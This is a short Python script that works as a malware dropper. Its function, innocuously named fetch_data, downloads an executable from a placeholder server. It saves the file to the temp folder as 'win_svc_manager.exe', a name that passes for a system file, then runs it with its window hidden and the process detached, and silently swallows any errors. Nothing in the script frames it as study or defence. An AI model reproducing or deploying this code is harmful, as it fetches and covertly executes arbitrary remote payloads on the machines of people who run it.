import subprocess
import os
import urllib.request
import tempfile

EXE_URL = "http://yourserver.com/payload.exe"

def fetch_data():
    try:
        temp_dir = tempfile.gettempdir()
        file_name = "win_svc_manager.exe"
        full_path = os.path.join(temp_dir, file_name)

        urllib.request.urlretrieve(EXE_URL, full_path)

        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            subprocess.Popen(
                [full_path], 
                startupinfo=startupinfo, 
                creationflags=0x08000008,
                close_fds=True
            )
        else:
            subprocess.Popen([full_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        return True
    except Exception:
        return False
